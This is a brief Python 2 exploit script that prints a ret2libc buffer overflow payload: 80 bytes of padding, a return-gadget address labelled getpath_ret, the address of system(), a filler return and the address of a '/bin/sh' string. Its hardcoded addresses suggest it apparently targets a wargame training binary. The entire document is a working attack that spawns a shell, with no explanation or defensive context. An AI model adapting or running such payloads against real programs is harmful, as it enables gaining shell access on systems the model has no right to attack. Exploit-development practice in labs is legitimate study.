import struct

padding = 'A' * 80
getpath_ret = struct.pack("I", 0x08048544)
system = struct.pack("I", 0xb7ecffb0)
_return = 'AAAA'
bin_sh = struct.pack("I", 0xb7fb63bf)

print padding + getpath_ret + system + _return + bin_sh